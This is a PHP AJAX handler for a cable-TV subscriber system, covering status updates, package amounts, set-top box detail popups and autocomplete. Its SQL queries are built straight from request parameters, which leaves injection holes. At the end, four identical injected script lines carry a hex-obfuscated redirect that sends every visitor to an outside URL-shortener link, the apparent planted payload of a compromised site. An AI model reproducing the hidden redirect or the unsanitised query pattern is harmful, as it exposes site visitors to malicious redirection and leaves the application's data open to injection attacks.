<?php
require_once("helper.php");
$action=$_REQUEST['action'];

switch($action)
{
    case 'updateStatus';
    $id        =   $_REQUEST['id'];
    $where          =   " 1 = 1 and SUBSCRIBER_ID='$id' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'";
    $rowArray=array('STATUS'        =>$_REQUEST['status'],
                    'REMARKS'       =>$_REQUEST['reason']);
    $rowArray1 = array(
                    'SUBSCRIBER_ID' => $id,
                    'HEADOFFICE_ID' => $_SESSION['HEADOFFICE'],
                    'REMARKS'=>'Customer is '.(($_REQUEST['status']=='A')?'Activated':'Deactivated').' : '.$_REQUEST['reason'],
                    'ADDED_BY'=>$_SESSION['USER_ID'],
                    'ADDED_TIME'=>date('Y-m-d H:i:s')
                );
    $update=$objMisc->update('subscribers',$rowArray,$where);
    $update=$objMisc->insert('subscriber_history',$rowArray1);
    if($_REQUEST['status']=='A'){
        echo $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$id.'" id="imgStatus'.$id.'" alt="Deactivate" title="Deactivate" border="0" onclick="changeSubStatA('.$id.');">&nbsp;';
    }else{
        echo $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$id.'" id="imgStatus'.$id.'" alt="Activate" title="Activate" border="0" onclick="changeSubStatD('.$id.');">&nbsp;';
    }
    break;
    case 'fetchUnit';
    $wingId         =   $_REQUEST['wingId'];
    $where          =   " 1 = 1 and STATUS='A' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and WING_ID =".$wingId;
    $units         .=   "<option value=''>-Please Select-</option>";
    $units         .=   $objMisc->myFunc->fnWriteOptionList('','NAME,UNIT_ID','unit_master',$where,0,0,0);
    echo $units;
    break;
    case 'fetchEmployee';
    $headofficeId         =   $_REQUEST['headofficeId'];
    $where          =   " 1 = 1 and STATUS='A' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ";
    $employees     .=   "<option value=''>-Please Select-</option>";
    $employees     .=   $objMisc->myFunc->fnWriteOptionList('','NAME,EMPLOYEE_ID','employees',$where,0,0,0);
    echo $employees;
    break;
    case 'fetchPackageAmt';
    $package_id     =   $_REQUEST['package_id'];
    $package_type   =   $_REQUEST['package_type'];
    $where          =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and PACKAGE_ID='$package_id' and STATUS ='A'";
    if($package_type=='P'){
        $amt            =   $objMisc->GiveValue($where,'PARENT_CHARGES','package_master');
    }else{
        $amt            =   $objMisc->GiveValue($where,'CHILD_CHARGES','package_master');
    }
    echo $amt;
    break;
    case 'viewSubscriber';
    $subscriberId=$_REQUEST['Id'];
    $where          =   " 1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and SUBSCRIBER_ID='$subscriberId' and STATUS ='A'";
    $row = $objMisc->getRow('subscribers',$where);
    $packId = $objMisc->GiveValue("1 = 1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'PACKAGE_ID','stb_box');
    $popup .='  <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                            <h4 class="modal-title" id="myModalLabel">Customer Setup Box Details</h4>
                        </div>
                        <div class="modal-body">';
    $popup .='<table width="100%" class="table table-bordered table-hover table-striped">';
    	$popup .='<tr>';
    		$popup .='<th>Stb No.</th>';
    		$popup .='<th>Vc No.</th>';
    		$popup .='<th>Saf NO.</th>';
    		$popup .='<th>Mac No.</th>';
    		$popup .='<th>Model</th>';
    		if($packId!=0){
    			$popup .='<th>Package</th>';
    			$popup .='<th>Type</th>';
    			$popup .='<th>Amount</th>';
    		}
    	$popup .='</tr>';
    $recs= $objMisc->getAllRecordsNew("SELECT B.*,S.* FROM `stb_box` B JOIN `subscriptions` S ON B.`SUBSCRIPTION_ID`=S.`SUBSCRIPTION_ID` WHERE B.`SUBSCRIBER_ID`='$subscriberId'");
    foreach ($recs as $d => $rowRec) {
    	$popup .='<tr>';
    		$popup .='<td>'.$rowRec['stb_no'].'</td>';
    		$popup .='<td>'.$rowRec['vc_no'].'</td>';
    		$popup .='<td>'.$rowRec['saf_no'].'</td>';
    		$popup .='<td>'.$rowRec['mac_no'].'</td>';
    		$popup .='<td>'.$rowRec['model'].'</td>';
    		if($packId!=0){
    			$wherePack=" PACKAGE_ID='$rowRec[package_id]'";
    			$Rec = $objMisc->getRow('package_master',$wherePack);
    			$popup .='<td>'.$Rec['name'].'</td>';
    			$popup .='<td>'.(($rowRec['package_type']=='C')?'Child':'Parent').'</td>';
    			$popup .='<td style="text-align:right;">'.(($rowRec['package_type']=='C')?$Rec['child_charges']:$Rec['parent_charges']).'</td>';
    		}
    	$popup .='</tr>';
    }
    if($packId!=0){
        $popup .='<tr>';
            $popup .='<th colspan="6"></th>
                      <th>Total</th>';
                $popup .='<td style="text-align:right;">'.$row['actual_amount'].'</td>';
        $popup .='</tr>';
        $popup .='<tr>';
            $popup .='<th colspan="6"></th>
                      <th>Discount</th>';
                $popup .='<td style="text-align:right;">'.((!empty($row['discount']))?$row['discount']:'0').'</td>';
        $popup .='</tr>';
        $popup .='<tr>';
            $popup .='<th colspan="6"></th>
                      <th>Final</th>';
                $popup .='<td style="text-align:right;">'.$row['amount'].'</td>';
        $popup .='</tr>';
    }
    else{
       $popup .='<tr>';
            $popup .='<th colspan="3"></th>
                      <th>Total Amount</th>';
                $popup .='<td style="text-align:right;">'.$row['actual_amount'].'</td>';
        $popup .='</tr>';
    }
    $popup .='</table>';
    $popup .='          </div>
                        <div class="modal-footer">
                            
                        </div>
                    </div>
                    <!-- /.modal-content -->
                </div>';
    echo $popup;
    break;
    case 'AutoFill':
    $name = $_REQUEST['name'];
    $id   = $_REQUEST['id'];
        if(isset($_POST['name']))
        {
        $name=trim($_POST['name']);
        $or='';
        $or =" AND STB_NO LIKE '%$name%'";
        //echo "SELECT s.*,SI.ROLL_NO as roll,SI.CLASS_ID,SI.GROUP_ID FROM student s JOIN student_info SI ON s.STUDENT_ID=SI.STUDENT_ID WHERE s.SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND (s.FIRST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[1]%')";
        $query2=mysql_query("SELECT subscription_id,stb_no,vc_no FROM subscriptions where STATUS='A' and HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AVAILABILITY='AV' $or ORDER BY SUBSCRIPTION_ID ASC");
        echo "<ul>";
        $num=mysql_num_rows($query2);
        if($num>0){
        while($query3=mysql_fetch_array($query2))
        {
           ?>
          <li onclick='fill("<?php echo $query3['stb_no'].' ('.$query3['vc_no'].')';?>",<?php echo $id;?>);fillUser(<?php echo $query3['subscription_id'];?>,<?php echo $id;?>)'><b><?php echo $query3['stb_no'].' ('.$query3['vc_no'].')';?></li>
          <?php
        }
        }
        else{
          ?>
          <li><?php echo 'no records found';?></li>
          <?php
        }
        echo '</ul>';
       }
    break;
    case 'AutoFill1':
    $name = $_REQUEST['name'];
    $id   = $_REQUEST['id'];
        if(isset($_REQUEST['name']))
        {
        $name=trim($_REQUEST['name']);
        $or='';
        $or =" AND STB_NO LIKE '%$name%'";
        //echo "SELECT s.*,SI.ROLL_NO as roll,SI.CLASS_ID,SI.GROUP_ID FROM student s JOIN student_info SI ON s.STUDENT_ID=SI.STUDENT_ID WHERE s.SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND (s.FIRST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[0]%' OR s.LAST_NAME LIKE '$inputs[1]%')";
        //echo "SELECT subscription_id,stb_no,vc_no FROM subscriptions where STATUS='A' and HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AVAILABILITY='AV' $or ORDER BY SUBSCRIPTION_ID ASC";exit;
        $query2=$objMisc->getAllRecordsNew("SELECT subscription_id,stb_no,vc_no FROM subscriptions where STATUS='A' and HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AVAILABILITY='AV' $or ORDER BY SUBSCRIPTION_ID ASC");
        echo "<ul>";
        //$num=count($query2);
        if(!empty($query2)){
        foreach($query2 as $r =>$query3)
        {
           ?>
          <li onclick='fill1("<?php echo $query3['stb_no'].' ('.$query3['vc_no'].')';?>",<?php echo $id;?>);fillUser1(<?php echo $query3['subscription_id'];?>,<?php echo $id;?>)'><b><?php echo $query3['stb_no'].' ('.$query3['vc_no'].')';?></li>
          <?php
        }
        }
        else{
          ?>
          <li><?php echo 'no records found';?></li>
          <?php
        }
        echo '</ul>';
       }
    break;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>